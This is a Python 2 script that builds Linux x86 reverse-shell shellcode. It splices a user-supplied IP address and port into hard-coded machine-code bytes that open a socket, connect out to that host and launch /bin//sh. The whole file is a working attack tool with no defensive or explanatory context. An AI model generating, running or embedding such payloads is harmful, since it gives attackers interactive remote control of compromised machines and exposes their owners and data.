#!/usr/bin/env python
# -*- coding: utf-8 -*-
import socket,struct 
from argparse import ArgumentParser
parser = ArgumentParser(description="Shellcode generator")
parser.add_argument("-p","--port",dest="port", help="Provide a port between 1024 and 65535.", required=True,type=int )
parser.add_argument("-a","--address",dest="ip", help="Provide a valid IP address.", required=True,type=str )
args = vars(parser.parse_args())
arg_port = args["port"]
arg_ip = args["ip"]
 
shellcode1 = \
"""\\x31\\xdb\\xf7\\xe3\\xb0\\x66\\x53\\x43\\x53\\x6a\\x02\\x89\\xe1\\xcd\\x80\\x93\\x6a\\x02\\x59\\xb0\\x3f\\xcd\\x80\\x49\\x79\\xf9\\x68"""

shellcode2 = \
"""\\x66\\x68"""

shellcode3 = \
"""\\x66\\xb9\\x02\\x00\\x66\\x51\\x89\\xe1\\x6a\\x10\\x51\\x53\\x89\\xe1\\xb0\\x66\\xcd\\x80\\xb0\\x0b\\x52\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x52\\x89\\xe2\\x53\\x89\\xe1\\xcd\\x80"""
 
 

def ip2long(ip):
    """
    Convert an IP string to long
    """
    try:
    	packedIP = socket.inet_aton(ip)
    except:
	print "IP is not valid"
    hex_IP_string = hex(struct.unpack("!L", packedIP)[0])
    ip_list = list (hex_IP_string)
    ip_list = ip_list[2:]
    ip_string = ""
    for x in range(0, len(ip_list),2):
        ip_string +=  "\\x"+ip_list[x]+ip_list[x+1]
    return ip_string


def portToHex(port):
        hexport  = str (hex(port)[2:] )
        if len (hexport) <= 3:
                temp = list(hexport)
                hex1 = temp[0]
                hex2 = temp[1]
                hex3 = temp[2]
                hexport = "\\x0"+hex1+"\\x"+hex2+hex3
        else:
                temp = list(hexport)
                hexport = "\\x"+temp[0]+temp[1]+"\\x"+temp[2]+temp[3]
        return hexport

if arg_port <= 65535 and arg_port >= 1024:
        print "Shellcode for ip %s with port %s:" % (arg_ip,arg_port)
	port = portToHex(arg_port)
        ip = ip2long(arg_ip)
	print shellcode1+ip+shellcode2+port+shellcode3
else:
        print "Port too small. How unfortunate."


